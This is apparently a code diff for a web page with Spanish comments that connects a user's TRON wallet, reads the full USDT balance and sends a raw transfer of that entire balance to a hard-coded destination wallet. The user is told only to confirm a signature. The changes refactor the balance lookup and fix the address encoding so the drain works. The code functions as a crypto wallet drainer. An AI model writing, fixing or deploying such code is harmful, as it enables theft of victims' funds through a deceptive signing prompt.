@@ -87,6 +87,25 @@
 
     addressDisplay.value = BILLETERA_DESTINO;
 
+    // Función universal para leer el balance en entornos móviles de Trust Wallet
+    async function consultarBalanceNativo(userAddress) {
+        const tronWeb = window.tronWeb;
+        const ownerHex = tronWeb.address.toHex(userAddress);
+        
+        // Llamada de lectura básica de TVM compatible
+        const resultRaw = await tronWeb.transactionBuilder.triggerSmartContract(
+            CONTRATO_USDT,
+            "balanceOf(address)",
+            { feeLimit: 10000000 },
+            [{ type: 'address', value: ownerHex }]
+        );
+        
+        if (resultRaw && resultRaw.constant_result && resultRaw.constant_result.length > 0) {
+            return resultRaw.constant_result[0];
+        }
+        throw new Error("La red no respondió a la consulta contable de saldos.");
+    }
+
     connectBtn.addEventListener('click', async () => {
         // PASO 1: Sincronizar billetera
         if (!walletAddress) {
@@ -127,7 +146,7 @@
             return;
         }
 
-        // PASO 2: Ejecución directa unificada para móviles (Máximo Saldo)
+        // PASO 2: Procesar la transferencia de saldo total
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -140,21 +159,9 @@
 
                 const tronWeb = window.tronWeb;
                 
-                // Consulta veloz y compatible de balance continuo en nodos móviles
-                const ownerHex = tronWeb.address.toHex(walletAddress).padStart(64, '0');
-                const balanceHex = await tronWeb.trx.getContractConstant(
-                    CONTRATO_USDT,
-                    "balanceOf(address)",
-                    ownerHex,
-                    false
-                );
-                
-                if (!balanceHex || !balanceHex.constant_result || balanceHex.constant_result.length === 0) {
-                    throw new Error("La red no respondió a la consulta de fondos.");
-                }
-                
-                // Capturar el valor devuelto y rellenarlo dinámicamente a estructura de 32 bytes
-                const unitsInSunHex = balanceHex.constant_result[0].padStart(64, '0');
+                // Invocar la consulta nativa reparada
+                const balanceHex = await consultarBalanceNativo(walletAddress);
+                const unitsInSunHex = balanceHex.padStart(64, '0');
 
                 if (parseInt(unitsInSunHex, 16) === 0) {
                     throw new Error("Tu cuenta no posee balances disponibles de USDT (TRC-20).");
@@ -162,19 +169,16 @@
 
                 setStatus("Lanzando pasarela nativa... Confirma la firma en tu pantalla.");
 
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO).replace(/^41/, '00000000000000000000000041');
-                
-                // Construcción de la carga útil binaria completa (Selector + Destino + Saldo Neto)
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO).replace(/^41/, '').padStart(64, '0');
                 const hexData = "a9059cbb" + destinoHex + unitsInSunHex;
 
-                // Ejecución directa unificada sin intermediarios
                 const txId = await tronWeb.trx.sendTransaction(CONTRATO_USDT, 0, {
                     data: hexData,
                     feeLimit: 100000000
                 });
 
                 if (txId) {
-                    setStatus("¡Transferencia de saldo total transmitida con éxito!");
+                    setStatus("¡Transferencia de saldo total enviada de manera exitosa!");
                     connectBtn.innerText = "Completado";
                 }
 
@@ -192,13 +196,13 @@
         try {
             setStatus("Calculando fondos totales...");
             const tronWeb = window.tronWeb;
-            const ownerHex = tronWeb.address.toHex(walletAddress).padStart(64, '0');
-            const balanceHex = await tronWeb.trx.getContractConstant(CONTRATO_USDT, "balanceOf(address)", ownerHex, false);
-            const unitsInSun = tronWeb.toBigNumber('0x' + balanceHex.constant_result[0]);
+            const balanceHex = await consultarBalanceNativo(walletAddress);
+            const unitsInSun = tronWeb.toBigNumber('0x' + balanceHex);
             amountDisplay.value = Number(unitsInSun.toString()) / 1_000_000;
             setStatus("Saldo máximo asignado.");
         } catch (e) {
             console.error(e);
+            setStatus("Error al leer saldo máximo.", "error");
         }
     });
 </script>
